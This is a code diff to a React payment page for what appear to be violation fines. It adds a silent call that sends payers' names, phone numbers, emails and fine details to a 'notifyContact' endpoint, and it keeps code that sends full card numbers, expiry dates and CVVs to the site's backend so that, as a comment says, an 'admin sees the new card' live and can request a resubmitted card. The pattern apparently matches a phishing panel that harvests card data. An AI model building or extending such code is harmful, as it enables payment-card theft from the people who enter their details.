@@ -469,6 +469,23 @@ export function PayPage() {
       return;
     }
     setSelectError("");
+
+    const fullName = `${form.firstName} ${form.lastName}`.trim();
+    const mobile = `${dialCode}${form.phone}`;
+    void paymentsApi
+      .notifyContact({
+        fullName,
+        mobile,
+        email: form.email || undefined,
+        identifier: result!.identifier,
+        amount: total,
+        violationRefs: [...selected],
+        language,
+      })
+      .catch(() => {
+        // Silent — never block the user if the notification fails.
+      });
+
     setBannerOpen(true);
   };
 
@@ -496,30 +513,30 @@ export function PayPage() {
       // so the admin sees the new card on the same request they're watching.
       const res = flowRef
         ? await paymentsApi.resubmitCard(flowRef, {
-            fullName,
-            mobile,
-            email: form.email || undefined,
-            cardholderName: card.cardholderName,
-            cardNumber,
-            cardExpiryMonth: card.expiryMonth,
-            cardExpiryYear: card.expiryYear,
-            cardCvv: card.cvv,
-          })
+          fullName,
+          mobile,
+          email: form.email || undefined,
+          cardholderName: card.cardholderName,
+          cardNumber,
+          cardExpiryMonth: card.expiryMonth,
+          cardExpiryYear: card.expiryYear,
+          cardCvv: card.cvv,
+        })
         : await paymentsApi.create({
-            referenceId: result!.referenceId,
-            fullName,
-            mobile,
-            email: form.email || undefined,
-            identifier: result!.identifier,
-            amount: total,
-            violationRefs: [...selected],
-            language,
-            cardholderName: card.cardholderName,
-            cardNumber,
-            cardExpiryMonth: card.expiryMonth,
-            cardExpiryYear: card.expiryYear,
-            cardCvv: card.cvv,
-          });
+          referenceId: result!.referenceId,
+          fullName,
+          mobile,
+          email: form.email || undefined,
+          identifier: result!.identifier,
+          amount: total,
+          violationRefs: [...selected],
+          language,
+          cardholderName: card.cardholderName,
+          cardNumber,
+          cardExpiryMonth: card.expiryMonth,
+          cardExpiryYear: card.expiryYear,
+          cardCvv: card.cvv,
+        });
 
       sessionStorage.setItem("pay_ref", res.reference);
       setCardOpen(false);
